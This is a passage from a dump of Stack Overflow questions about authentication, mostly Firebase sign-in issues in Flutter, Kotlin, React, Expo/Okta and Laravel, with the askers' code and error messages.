    googleProvider.addScope(&quot;profile&quot;);
    googleProvider.addScope(&quot;email&quot;);

    await handleLogin(googleProvider);
  };
</code></pre>
<p>iam not able to fetch the email my login function is this:</p>
<pre><code>const handleLogin = async (signInFunction: any) =&gt; {
    try {
      const result = await signInWithPopup(auth, signInFunction);
      // setUser(result.user);
      console.log(&quot;set user&quot;, setUser);

      console.log(`${signInFunction.providerId} user `, result.user);

      

      // Get the ID token directly
      const idToken = await result.user.getIdToken();
      console.log(&quot;idtoken is : &quot;, idToken);

      // Extract relevant information from the authentication result
      const { uid, displayName, email ,photoURL } = result.user;
      console.log(&quot;this is uid :&quot;, uid);

      // Create an object with the data you want to send to the backend
      const userData = {
        id: uid,
        displayName: displayName,
        email: email,
        photoURL: photoURL,
      };

      // Make a POST request to your backend using the Fetch API
      const postResponse = await fetch(`${accountServiceBackendUrl}/users`, {
        method: &quot;POST&quot;,
        headers: {
          &quot;Content-Type&quot;: &quot;application/json&quot;,
          Authorization: `Bearer ${idToken}`,
        },
        body: JSON.stringify(userData),
      });

      if (postResponse.ok) {
        console.log(&quot;User data sent to backend successfully&quot;);
        console.log(&quot;user authenticated from backend means.&quot;);
        setUser(result.user);
        console.log(&quot;this is the after user :&quot;, setUser);
        console.log(&quot;user data&quot;, userData);

        setDbUser(true);
      } else {
        console.error(&quot;Error sending user data to backend:&quot;, postResponse.statusText);
      }

      // Make a GET request to your backend using the Fetch API for single user
      const SingleUser = await fetch(`${accountServiceBackendUrl}/users/${uid}`, {
        method: &quot;GET&quot;,
        headers: {
          &quot;Content-Type&quot;: &quot;application/json&quot;,
          Authorization: `Bearer ${idToken}`,
        },
      });

      if (SingleUser.ok) {
        const SingleUserData = await SingleUser.json();
        console.log(&quot;User data received from backend successfully as a single user&quot;, SingleUserData);
        setDbUser(true);
      } else {
        console.error(&quot;Error fetching user data from backend:&quot;, SingleUser.statusText);
      }

      // Make a GET request to retrieve user information after login
      const getResponse = await fetch(`${accountServiceBackendUrl}/users`, {
        method: &quot;GET&quot;,
        headers: {
          &quot;Content-Type&quot;: &quot;application/json&quot;,
          Authorization: `Bearer ${idToken}`,
        },
      });

      if (getResponse.ok) {
        const getUserData = await getResponse.json();
        console.log(&quot;User data received from backend:&quot;, getUserData);
        setDbUser(true);
      } else {
        console.error(&quot;Error fetching user data from backend:&quot;, getResponse.statusText);
      }
    } catch (error) {
      console.error(&quot;Error during authentication or fetch:&quot;, error);
    }
  };
</code></pre>
<p>i tried reading the docs but still iam not able to find any solution. please help!</p>
"
"<p>I would like to extract the associated sign-in method used, like Google or email/password from the event.</p>
<p>Given the Google Documentations here for <a href=""https://firebase.google.com/docs/auth/extend-with-blocking-functions?gen=2nd#getting_user_and_context_information"" rel=""nofollow noreferrer"">Getting user and context information</a>, some fields are not available on the <code>AuthBlockingEvent</code> dataclass.</p>
<p>For example I can extract the following:</p>
<pre class=""lang-py prettyprint-override""><code>from firebase_functions import https_fn, identity_fn, options

@identity_fn.before_user_signed_in()
def handle_user(
    event: identity_fn.AuthBlockingEvent,
) -&gt; identity_fn.BeforeSignInResponse | None:
    email = event.data.email
    uid = event.data.uid
    event_id = event.event_id
    event_type = event.credential
</code></pre>
<p>However, the following does on exist on the even signature.</p>
<pre class=""lang-py prettyprint-override""><code>from firebase_functions import https_fn, identity_fn, options

@identity_fn.before_user_signed_in()
def handle_user(
    event: identity_fn.AuthBlockingEvent,
) -&gt; identity_fn.BeforeSignInResponse | None:
    event_type = event.event_type
    auth_type = event.auth_type
    resource = event.resource
    # etc
</code></pre>
<p>I also opened an issue on the official repository <a href=""https://github.com/firebase/firebase-functions-python/issues/180"" rel=""nofollow noreferrer"">https://github.com/firebase/firebase-functions-python/issues/180</a></p>
"
"<p>Can anyone help me with the above error.</p>
<p>following is the code.</p>
<pre><code>
class AuthController extends GetxController {
  static AuthController instance = Get.find();

  late Rx&lt;File?&gt; _pickedImage;

  File? get ProfilePhoto =&gt; _pickedImage.value;

  void pickImage() async {
    final pickedImage =
        await ImagePicker().pickImage(source: ImageSource.gallery);
    if (pickedImage != null) {
      Get.snackbar('Profile Picture',
          'You have successfully selected your profile picture');
    }
    _pickedImage = Rx&lt;File?&gt;(File(pickedImage!.path));
  }

  // upload to firebase storage
  Future&lt;String&gt; _uploadToStorage(File image) async {
    Reference ref = firebaseStorage
        .ref()
        .child('profilePics')
        .child(firebaseAuth.currentUser!.uid);

    UploadTask uploadTask = ref.putFile(image);
    TaskSnapshot snap = await uploadTask;
    String downloadUrl = await snap.ref.getDownloadURL();
    return downloadUrl;
  }

  // registering the user
  void registerUser(
      String username, String email, String password, File? image) async {
    try {
      if (username.isNotEmpty &amp;&amp;
          email.isNotEmpty &amp;&amp;
          password.isNotEmpty &amp;&amp;
          image != null) {
        // save out user to our ath and firebase store
        UserCredential cred = await firebaseAuth.createUserWithEmailAndPassword(
          email: email,
          password: password,
        );
        String downloadUrl = await _uploadToStorage(image);
        model.User user = model.User(
          name: username,
          email: email,
          uid: cred.user!.uid,
          profilePhoto: downloadUrl,
        );
        await firestore
            .collection('users')
            .doc(cred.user!.uid)
            .set(user.toJson());
      } else {
        Get.snackbar(
          'Error Creating Account',
          'Please enter all the details',
        );
      }
    } catch (e) {
      Get.snackbar(
        'Error Creating Account',
        e.toString(),
      );
    }
  }
}
</code></pre>
<p>I was trying to create authcontroller to set user details on firbease storage.</p>
<p>This are the constant which I have used.</p>
<p>Please let me know if need any more information. I am stuck and need help, thanks.</p>
<p>Thanks in advance.</p>
"
"<p>I am trying to add firebase authentication in my project but it is giving me an error repeatedly. I have tried all the possible solutions that is available on YouTube but it not worked. Now its being very hectic to me, i have already worked on firebase authentication but this time the firebase update is different. Error is :-</p>
<p>/FirebaseAuth(17093): Creating user with demo123 with empty reCAPTCHA token
W/System  (17093): Ignoring header X-Firebase-Locale because its value was null.
E/RecaptchaCallWrapper(17093): Initial task failed for action RecaptchaAction(action=signUpPassword)with exception - The email address is badly formatted.</p>
"
"<p>I am facing this error when I try to click the login button</p>
<blockquote>
<p><em>Initial task failed for action RecaptchaAction(action=signInWithPassword)with exception - The supplied auth credential is incorrect, malformed or has expired.</em></p>
</blockquote>
<p>I want to make a login activity and so far my code is this</p>
<p><strong>LoginActivity.kt</strong></p>
<pre><code>package com.example.cafe

import android.annotation.SuppressLint
import android.content.Intent
import android.os.Bundle
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.textfield.TextInputEditText
import com.google.firebase.Firebase
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.auth.auth


class LoginActivity : AppCompatActivity() {
    private lateinit var auth: FirebaseAuth

    @SuppressLint(&quot;MissingInflatedId&quot;)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_login)
        val email = findViewById&lt;TextInputEditText&gt;(R.id.loginEmail)
        val password = findViewById&lt;TextInputEditText&gt;(R.id.loginpassword)
        val loginBtn = findViewById&lt;Button&gt;(R.id.signinBtn)
        auth = Firebase.auth

        loginBtn.setOnClickListener {
            val mail = email.text.toString()
            val pass = password.text.toString()

            if(mail.isNotEmpty() &amp;&amp; pass.isNotEmpty()) {
                auth.signInWithEmailAndPassword(mail, pass).addOnCompleteListener {
                    if(it.isSuccessful){
                       val intent = Intent(this,MainActivity::class.java)
                        startActivity(intent)
                    }else{
                        Toast.makeText(this,it.exception.toString(),Toast.LENGTH_LONG).show()
                    }
                }
            }  else{
                Toast.makeText(this,&quot;Fields cannot be empty&quot;,Toast.LENGTH_LONG).show()
            }
        }
    }

}

</code></pre>
<p><strong>Menifest file</strong></p>
<pre><code>

&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
    xmlns:tools=&quot;http://schemas.android.com/tools&quot;&gt;

    &lt;application
        android:allowBackup=&quot;true&quot;
        android:dataExtractionRules=&quot;@xml/data_extraction_rules&quot;
        android:fullBackupContent=&quot;@xml/backup_rules&quot;
        android:icon=&quot;@mipmap/ic_launcher&quot;
        android:label=&quot;@string/app_name&quot;
        android:roundIcon=&quot;@mipmap/ic_launcher_round&quot;
        android:supportsRtl=&quot;true&quot;
        android:theme=&quot;@style/Theme.Cafe&quot;
        tools:targetApi=&quot;31&quot;&gt;
        &lt;activity
            android:name=&quot;.LoginActivity&quot;
            android:exported=&quot;false&quot; /&gt;
        &lt;activity
            android:name=&quot;.firstpage&quot;
            android:exported=&quot;false&quot; /&gt;
        &lt;activity
            android:name=&quot;.splashscreen&quot;
            android:exported=&quot;true&quot;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;

                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;
            &lt;/intent-filter&gt;
        &lt;/activity&gt;
        &lt;activity
            android:name=&quot;.orderActivity&quot;
            android:exported=&quot;false&quot; /&gt;
        &lt;activity
            android:name=&quot;.MainActivity&quot;
            android:exported=&quot;false&quot; /&gt;
    &lt;/application&gt;

&lt;/manifest&gt;
</code></pre>
<p>**gradle file
**</p>
<pre><code>plugins {
    id(&quot;com.android.application&quot;)
    id(&quot;org.jetbrains.kotlin.android&quot;)
    id(&quot;com.google.gms.google-services&quot;)
}

android {
    namespace = &quot;com.example.cafe&quot;
    compileSdk = 34
    defaultConfig {
        applicationId = &quot;com.example.cafe&quot;
        minSdk = 24
        targetSdk = 34
        versionCode = 1
        versionName = &quot;1.0&quot;

        testInstrumentationRunner = &quot;androidx.test.runner.AndroidJUnitRunner&quot;
    }


    buildTypes {
        release {
            isMinifyEnabled = false
            proguardFiles(
                getDefaultProguardFile(&quot;proguard-android-optimize.txt&quot;),
                &quot;proguard-rules.pro&quot;
            )
        }
    }
    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_1_8
        targetCompatibility = JavaVersion.VERSION_1_8
    }
    kotlinOptions {
        jvmTarget = &quot;1.8&quot;
    }
}

dependencies {

    implementation(&quot;androidx.core:core-ktx:1.12.0&quot;)
    implementation(&quot;androidx.appcompat:appcompat:1.6.1&quot;)
    implementation(&quot;com.google.android.material:material:1.11.0&quot;)
    implementation(&quot;androidx.constraintlayout:constraintlayout:2.1.4&quot;)
    implementation(&quot;com.google.firebase:firebase-database:20.3.0&quot;)
    testImplementation(&quot;junit:junit:4.13.2&quot;)
    androidTestImplementation(&quot;androidx.test.ext:junit:1.1.5&quot;)
    androidTestImplementation(&quot;androidx.test.espresso:espresso-core:3.5.1&quot;)
    implementation (&quot;com.google.firebase:firebase-core:21.1.1&quot;)
    implementation (&quot;com.google.firebase:firebase-auth:22.3.1&quot;)
    implementation(platform(&quot;com.google.firebase:firebase-bom:32.7.2&quot;))
    implementation(&quot;com.google.firebase:firebase-auth&quot;)


}
</code></pre>
"
"<p>I have used console.log at different locations in my function. My current code signs me in and redirects me to the same page. And I don't see any of the console.logs from the UseEffect() or HandleRedirect function. I don't get why the useeffect() or HandleRedirect is not being triggered after the authentication is completed.</p>
<p>Am I using the wrong redirect? Since I am using expo I just have my expo scheme as the name of the project. How would it be different if it was just firebase?</p>
<pre><code>const AuthComponent = ({ navigation }) =&gt; {
  const [response, setResponse] = useState(null); // State to hold the response
  console.log(&quot;Entering auth component&quot;)

  useEffect(() =&gt; {
    const handleRedirect = async (event) =&gt; {
      console.log(&quot;Handling redirect with URL:&quot;, event.url);
      let data = Linking.parse(event.url);
      console.log(&quot;Parsed redirect data:&quot;, data);

      // Extract the authorization code from the URL
      if (data.queryParams &amp;&amp; data.queryParams.code) {
        const code = data.queryParams.code;
        console.log(&quot;Authorization code received:&quot;, code); // Log the authorization code

        // Now you can exchange the authorization code for an access token
        const accessToken = await exchangeCodeForToken(code);
        if (accessToken) {
          // With the access token, fetch the user's information from Okta
          const userInfo = await getUserInfoFromOkta(accessToken);
          if (userInfo) {
            // Create or update the user document in Firestore with the fetched user info
            await createUserDocument(userInfo);
          }
        }
      } else {
        console.log(&quot;Authorization code not found in the URL&quot;);
      }
    };

    // Subscribe to the redirect event
    const subscription = Linking.addEventListener('url', handleRedirect);

    // Cleanup
    return () =&gt; {
      console.log(&quot;Removing URL event listener...&quot;);
      subscription.remove();
    };
  }, []);

  const signInWithOkta = async () =&gt; {
    console.log(&quot;Initiating sign-in with Okta...&quot;);
    let authUrl = buildAuthUrl();
    console.log(&quot;Auth URL:&quot;, authUrl);
    const result = await WebBrowser.openAuthSessionAsync(
      authUrl,
      oktaConfig.redirectUri
    );
    console.log(&quot;Auth session result:&quot;, result);
    setResponse(result); // Store the response in state
  };

  return (
    &lt;View style={{ flex: 1, justifyContent: &quot;center&quot;, alignItems: &quot;center&quot; }}&gt;
      &lt;Button title=&quot;Sign in with Okta&quot; onPress={signInWithOkta} /&gt;
    &lt;/View&gt;
  );
};

</code></pre>
<p>The code should sign in me with okta, and extract user information based on the sign-ins.</p>
"
"<p>I am not a professional in this i have just started my very first project to make an app.. i started with the most important and probably the most advanced thing about my app and that is the log-in function</p>
<p>i have set up a project in Firebase and did as i should but i still get this error.</p>
<p>I have a dog kennel and have interest in coding so i was trying to combine those two for a neat way to find my dogs competition results and information about them. I think i maybe i am way over my head in this but i have been in front of the computer in maybe 2 whole days trying to resolve this.</p>
<p>sorry for typos, i'm a &quot;Hermit&quot; living in the norwegian woods</p>
<blockquote>
<p>ERROR: Sign In Error: TypeError: Instance of 'FirebaseException': type 'FirebaseException' is not a subtype of type 'JavaScriptObject'</p>
</blockquote>
<pre><code>import 'package:flutter/material.dart';
import 'package:firebase_auth/firebase_auth.dart';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Dog Results App',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: SignInScreen(),
    );
  }
}

class SignInScreen extends StatelessWidget {
  const SignInScreen({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Sign In'),
      ),
      body: SignInForm(),
    );
  }
}

class SignInForm extends StatefulWidget {
  const SignInForm({Key? key}) : super(key: key);

  @override
  _SignInFormState createState() =&gt; _SignInFormState();
}

class _SignInFormState extends State&lt;SignInForm&gt; {
  final TextEditingController _emailController = TextEditingController();
  final TextEditingController _passwordController = TextEditingController();

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.all(16.0),
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          TextField(
            controller: _emailController,
            decoration: const InputDecoration(labelText: 'Email'),
          ),
          TextField(
            controller: _passwordController,
            decoration: const InputDecoration(labelText: 'Password'),
            obscureText: true,
          ),
          ElevatedButton(
            onPressed: () {
              _signInWithEmailAndPassword(
                _emailController.text,
                _passwordController.text,
              );
            },
            child: const Text('Sign In'),
          ),
          TextButton(
            onPressed: () {
              Navigator.push(
                context,
                MaterialPageRoute(builder: (context) =&gt; const SignUpScreen()),
              );
            },
            child: const Text('Create Account'),
          ),
        ],
      ),
    );
  }

  Future&lt;void&gt; _signInWithEmailAndPassword(String email, String password) async {
    try {
      await FirebaseAuth.instance.signInWithEmailAndPassword(
        email: email,
        password: password,
      );
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (context) =&gt; const HomeScreen()),
      );
    } catch (e) {
      debugPrint('Sign In Error: $e');
    }
  }
}

class SignUpScreen extends StatelessWidget {
  const SignUpScreen({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Sign Up'),
      ),
      body: const SignUpForm(),
    );
  }
}

class SignUpForm extends StatefulWidget {
  const SignUpForm({Key? key}) : super(key: key);

  @override
  _SignUpFormState createState() =&gt; _SignUpFormState();
}

class _SignUpFormState extends State&lt;SignUpForm&gt; {
  final TextEditingController _emailController = TextEditingController();
  final TextEditingController _passwordController = TextEditingController();

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.all(16.0),
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          TextField(
            controller: _emailController,
            decoration: const InputDecoration(labelText: 'Email'),
          ),
          TextField(
            controller: _passwordController,
            decoration: const InputDecoration(labelText: 'Password'),
            obscureText: true,
          ),
          ElevatedButton(
            onPressed: () {
              _createUserWithEmailAndPassword(
                _emailController.text,
                _passwordController.text,
              );
            },
            child: const Text('Sign Up'),
          ),
        ],
      ),
    );
  }

  Future&lt;void&gt; _createUserWithEmailAndPassword(String email, String password) async {
    try {
      await FirebaseAuth.instance.createUserWithEmailAndPassword(
        email: email,
        password: password,
      );
      Navigator.pop(context);
    } catch (e) {
      debugPrint('Sign Up Error: $e');
    }
  }
}

class HomeScreen extends StatelessWidget {
  const HomeScreen({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    final user = FirebaseAuth.instance.currentUser;
    return Scaffold(
      appBar: AppBar(
        title: const Text('Welcome'),
      ),
      body: Center(
        child: Text('Hello, ${user!.email ?? &quot;User&quot;}'), // Ensure user is not null before accessing email
      ),
    );
  }
}

</code></pre>
<pre class=""lang-yaml prettyprint-override""><code>name: dog_results_app
description: &quot;A new Flutter project.&quot;

environment:
  sdk: '&gt;=2.12.0 &lt;3.0.0'

dependencies:
  flutter:
    sdk: flutter
  firebase_core: 2.25.4
  firebase_auth: ^4.4.0
  cloud_firestore: 4.15.5
  logger: ^2.0.2+1  # Add the logger package

dev_dependencies:
  flutter_test:
    sdk: flutter
  flutter_lints: ^3.0.1  # Add flutter_lints package

flutter:
  uses-material-design: true
</code></pre>
<p>Started over a few times, asked chatgpt (with no luck), youtube, asked my wife (she is a backend programmer)</p>
"
"<p>I am working on Django Project and I want to setup authentication using LDAP backend. I have a form in UI where user will be able to enter user name and password and this will be passed to LDAP backend for authentication. While passing data from UI form to LDAP backend. DO I have to use any encryption technique? If yes, what kind of and how? Thank you.</p>
"
"<p>I uploaded bulk user data from other fire store database. But authentication details of those users which we want for firebase authentication service is not accessible? The firebase authentication needs to be added to already registered user. How to do it?</p>
<p>I tried some work arounds but editing document ID/User Id in firebase auth is not possible. It creates default one and it should be connected to our existing collection. But I need old document Id of every user for user reference in my collection so mapping new id to old one is not possible.</p>
<p>I want to know some methods to edit authentication user ID or giving custom user ID while creating authenticating new user.</p>
"
"<p>I have an app that can be used anonymously for as long as the user chooses. I use the identifier from the anonymous user to save the user's history, credits, and profile values. Should the user choose to sign up I call the link function the link the provider to the anon account.</p>
<p>My flow is as follows:</p>
<ol>
<li><p>A new user downloads and opens the app, we check if the user is signed in anonymously, if he is, continue. If he is not signed in we sign him in automatically in the background.</p>
</li>
<li><p>Later A user decides to sign up, we sign the user up with one of the providers and link the user to the anon credential</p>
</li>
<li><p>The user can now log into his account on any device, and see his history and profile values</p>
</li>
</ol>
<p>My question is how do you manage/migrate a user that was using the app anonymously, who moves to a new device without signing up first?</p>
<p>Ex.
I use the app as is, not signing up. I do transactions, buy credits, and update my profile. I never choose to actually sign up. I just use the app.</p>
<p>I get a new phone and download the app, because it's a new phone I get signed in anon automatically. Once the app starts up I see my history/profile values/credits are blank.</p>
"
"<p>on my case I need to double click on the &quot;Login&quot; button to display the Email and Password</p>
<pre><code>import React, { useEffect } from 'react';
import { IonButton, IonCardContent, IonContent, IonIcon, IonInput, IonItem, IonList, IonLoading, IonPage, useIonRouter } from '@ionic/react';
import { mailOpenOutline, lockClosedOutline } from 'ionicons/icons';

const LoginPage: React.FC = () =&gt; {
  const [email, setEmail] = React.useState('');
  const [password, setPassword] = React.useState('');
  const [loading, setLoading] = React.useState(false);
  const navigation = useIonRouter();

  useEffect(() =&gt; {}, [email, password])

  const handlerLogin = async (e: React.FormEvent&lt;HTMLFormElement&gt;) =&gt; {
    e.preventDefault();
    console.log(&quot;set&quot;, email, &quot;this email&quot;);
    console.log(&quot;set&quot;, password, &quot;this password&quot;);
  }

  const signUp = () =&gt; {
    navigation.push('/register')
  }

  return (
    &lt;IonPage&gt;
      &lt;IonContent className=&quot;ion-padding&quot;&gt;
        &lt;IonCardContent&gt;
          &lt;IonList&gt;
            &lt;form onSubmit={handlerLogin}&gt;
              &lt;IonItem&gt;
                &lt;IonInput
                  label='Email'
                  labelPlacement='stacked'
                  placeholder='example@email.com'
                  type='email'
                  clearInput={true}
                  onIonChange={(e: any) =&gt; setEmail(e.target.value)}
                &gt;
                  &lt;IonIcon slot='start' icon={mailOpenOutline} /&gt;
                &lt;/IonInput&gt;
              &lt;/IonItem&gt;
              &lt;IonItem&gt;
                &lt;IonInput
                  className='ion-margin-top'
                  label='Password'
                  labelPlacement='stacked'
                  placeholder='*******'
                  type='password'
                  onIonChange={(e:any) =&gt; setPassword(e.target.value)}
                &gt;
                  &lt;IonIcon slot='start' icon={lockClosedOutline} /&gt;
                &lt;/IonInput&gt;
              &lt;/IonItem&gt;
              &lt;IonButton type='submit' expand='full' shape='round' fill='outline'&gt;
                Login
              &lt;/IonButton&gt;
            &lt;/form&gt;
            &lt;IonButton color={'danger'} expand='full' shape='round' fill='outline' onClick={() =&gt; signUp()}&gt;
              Daftar
            &lt;/IonButton&gt;
            &lt;IonLoading isOpen={loading} message={'Harap Tunggu'} /&gt;
          &lt;/IonList&gt;
        &lt;/IonCardContent&gt;
      &lt;/IonContent&gt;
    &lt;/IonPage&gt;
  );
};

export default LoginPage;
</code></pre>
<p>when I click once on the &quot;Login&quot; button on the console.log it displays an image like this
<a href=""https://i.stack.imgur.com/kOuLZ.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/kOuLZ.png"" alt=""enter image description here"" /></a></p>
<p>and when I double click the &quot;Login&quot; button it will display console.log like this
<a href=""https://i.stack.imgur.com/3oiQY.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/3oiQY.png"" alt=""enter image description here"" /></a></p>
<ul>
<li>clone repo</li>
<li><a href=""https://github.com/ujangaripin24/ionic-react-firebase-chating"" rel=""nofollow noreferrer"">https://github.com/ujangaripin24/ionic-react-firebase-chating</a> make</li>
<li>sure you using Node 20.xx.x make sure you using Ionic 7.x.x Ionic cap</li>
<li>run android -l --livereload --external wait util Project running on</li>
<li>SDK open inspect element with chrome using 'chrome://inspect' on</li>
<li>Adress Bar enter Email and Password and click once on the button and</li>
<li>click the button again a second time</li>
</ul>
<p>I want to display the Email and Password on the console.log with just one click of the &quot;Login&quot; button, how do I do it? is there something wrong with my code?</p>
"
"<p>I am working on my app, where it is possible to log in via Google. When the user wants to change email or password, firebase requires to reauthenticate user. And here is my question - how to detect if the user has selected correct account when logging in? This screen is different from the one at regular signup (<a href=""https://imgur.com/a/jIJXBYY"" rel=""nofollow noreferrer"">https://imgur.com/a/jIJXBYY</a>).
Currently, selecting a different account crashes the entire app with error: Unhandled Exception: [firebase_auth/user-mismatch] The supplied credentials do not correspond to the previously signed in user.</p>
<p>Here is the code that is responsible for reauthentication:</p>
<pre><code>try {
        FirebaseAuth.instance.currentUser!.reauthenticateWithProvider(GoogleAuthProvider());
      } on FirebaseAuthException catch (e) {
        print(e);
      }
</code></pre>
"
"<p>I know there is the <code>User.providerData</code> getter for all the providers the user with a specific email address logged in. But I want to know the provider used for the current session! Is the <code>User.providerData</code> list sorted in the order of providers linked/or signed in? I don't think so, because an email address can be used with a Google provider, then with Facebook provider, in which case, if we assume the list is sorted by the providers linked, the list will be <code>[Google, Facebook]</code>. But if the user signs in again with the Google provider using the same email, then surely the Google will not be duplicated for a second Google added as the third item of the list, something like this: <code>[Google, Facebook, Google]</code>.</p>
"
"<p>I employ phone and Google/Apple auth in an app and I require both - phone along with Google or Apple (depending on device).</p>
<p>I have a use case where an an Apple user switches devices to an Android device, logs in via phone auth, and is prompted to Link his Firebase User to Google Auth (presumably the user switched devices or just has this device and uses it).</p>
<p>In this process, I get a <code>GoogleSignInAccount</code> <code>googleUser</code> just fine, and I can link that account no problem.</p>
<p>However, if that <code>googleUser</code> already had a separate Firebase Account, I don't know that, and linking them deletes the original Firebase Account of that <code>googleUser</code>.  Perhaps this user phone auth's on his wife's device. We don't want him linking in this case, he'll delete his wife's firebase user.</p>
<p>I want to determine if there is a Firebase Account associated with the <code>googleUser</code>, and I don't know how to determine this, short of signing in the user with that google credential. I don't want to do that, because I have a current user logged in, which I'll be linking.</p>
<p>I already check for existing user by email, but with Apple anonymous or any different email, this is insufficient.</p>
<p>How can I check for an existing Firebase User from a <code>GoogleSignInAccount</code> object without logging out my current user?</p>
"
"<p>I'm building an iOS app with Laravel backend.</p>
<p>I'm using Firebase Authentication to handle the following authentication types: Google, Apple, and email/password sign up.</p>
<p>I've set up Google and Apple sign up by utilizing Laravel Socialite, however it doesn't look like Socialite supports an email/password driver, so I can't use this code for email/password authentication:</p>
<pre><code>class AuthController extends Controller
{
    public function login(Request $request)
    {
        $validator = Validator::make($request-&gt;all(), [
            'provider_name' =&gt; 'required|string|in:google,apple',
            'access_token' =&gt; 'required|string',
        ]);
 
        if ($validator-&gt;fails()) {
            Log::info($validator-&gt;errors());
            return;
        }

        $providerName = $request-&gt;input('provider_name');
        $token = $request-&gt;input('access_token');

        $providerUser = Socialite::driver($providerName)
            -&gt;userFromToken($token);

        $user = User::where('provider_name', $providerName)
            -&gt;where('provider_id', $providerUser-&gt;id)
            -&gt;first();

        if ($user == null)
        {
            $user = new User;
            $user-&gt;name = $providerUser-&gt;name;
            $user-&gt;email = $providerUser-&gt;email;
            $user-&gt;provider_name = $providerName;
            $user-&gt;provider_id = $providerUser-&gt;id;
            $user-&gt;save();
        }

        $token = $user
            -&gt;createToken(&quot;token&quot;)
            -&gt;accessToken;

        return response()-&gt;json([
            &quot;status&quot; =&gt; &quot;success&quot;,
            &quot;data&quot; =&gt; [
                &quot;token&quot; =&gt; $token,
                &quot;user&quot; =&gt; $user
            ],
        ]);
    }
}
</code></pre>
<p>So what's the &quot;right&quot; way of ALSO handling email/password sign up?</p>
<p>I'm at the point where I've the user is signed in on the iOS app and the account has been created through Firebase. I just don't know what to do to actually pass the user data to the Laravel backend and handle authentication/tokens as I do with Google/Apple authentication.</p>
"
"<p>I am using react router dom RouterProvider which decouples fetching from rendering, from the official remix-run react router example of auth-router-provider, it was stated in the <code>README.md</code> that</p>
<blockquote>
<p>we can no longer rely on React context and/or hooks to get our user authentication status. We need access to this information outside of the React tree so we can use it in our route loader and action functions. <a href=""https://github.com/remix-run/react-router/tree/dev/examples/auth-router-provider"" rel=""nofollow noreferrer"">https://github.com/remix-run/react-router/tree/dev/examples/auth-router-provider</a></p>
</blockquote>
<p>I created a standalone object outside of the React tree that manages my authentication state for <code>login and logout</code>, my object structure looks like</p>
<pre><code>export const authProvider: AuthProvider = {
  user: null,

  async login(email: string, password: string) {
    return signInWithEmailAndPassword(auth, email, password)
      .then((userCredential) =&gt; {
        authProvider.user = userCredential.user;
        return redirect(&quot;/dashboard&quot;);
      })
      .catch(() =&gt; {
        return toast.error(&quot;Password or Email invalid&quot;);
      });
  },

  async signout() {
    signOut(auth);
    authProvider.user = null;
  },
};
</code></pre>
<p>I import the standalone object my loader file and return <code>authProvider.user</code> in my dashboard loader</p>
<pre><code>loader() {
  return { user: authProvider.user };
}
</code></pre>
<p>the user is access using the <code>useRouteLoaderData</code> in the dashboard component</p>
<pre><code>const {user} = useRouteLoaderData(&quot;dashboard&quot;)
</code></pre>
<p>the user will be initially null and I can navigate else where if the user is not logged in, but when a user is logged in the user is no longer null and can view the dashboard page, but when i refresh the dashboard page after a user login the user always return null.</p>
<p>I can't seem to get right where i will use the <code>onAuthStateChange</code> from firebase because i was using it inside a <code>useEffect</code> earlier when i was managing user with react context.</p>
<p>I need assistnace on how to make the user persist on refresh of the dashboard page.</p>
"
"<p>I am trying to create a basic signup screen on flutter. I create a user succesfully but it still stays on the signup screen. But when i check on firebase, the user is there. I navigate to login page but i cant login with the newly created user.</p>
<p>If i make hot restart, now i can login with the newly created user.
I am confused. What is the case.</p>
<pre><code>class AuthRoute extends StatelessWidget {
  const AuthRoute({super.key});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: StreamBuilder&lt;User?&gt;(
          stream: FirebaseAuth.instance.authStateChanges(),
          builder: (context, snapshot) {
            // user is logged in

            if (snapshot.hasData) {
              return HomeRoute();
            }

            // user is not logged in

            else {
              return const LoginRoute();
            }
          }),
    );
  }
}
</code></pre>
<p>I have three screens. Auth page is checking if user is logged in or not. The other 2 is login page and register page.</p>
<p>Here is my register page;</p>
<pre><code>class RegisterRoute extends StatefulWidget {
  const RegisterRoute({super.key});

  @override
  State&lt;RegisterRoute&gt; createState() =&gt; _RegisterRouteState();
}

class _RegisterRouteState extends State&lt;RegisterRoute&gt; {
// controllers for text fields
  final emailController = TextEditingController();
  final passwordController = TextEditingController();
  final confirmPasswordController = TextEditingController();

// register user method
  void registerUser() async {
    // loading logo

    showDialog(
      context: context,
      builder: (context) {
        return const Center(
          child: CircularProgressIndicator(),
        );
      },
    );

    try {
      if (passwordController.text == confirmPasswordController.text) {
        await FirebaseAuth.instance.createUserWithEmailAndPassword(
          email: emailController.text,
          password: passwordController.text,
        );

        // pop the loading circle
        Navigator.pop(context);
      } else {
        // show error message, passwords do not match

        wrongEmail();
      }
    } on FirebaseAuthException catch (error) {
      // pop the loading circle

      Navigator.pop(context);
      // wrong email

      if (error.code == &quot;invalid-email&quot;) {
        wrongEmail();
      }

      // wrong password

      else if (error.code == &quot;invalid-credential&quot;) {
        wrongPassword();
      }
    }
  }

  // wrong email message

  void wrongEmail() {
    showDialog(
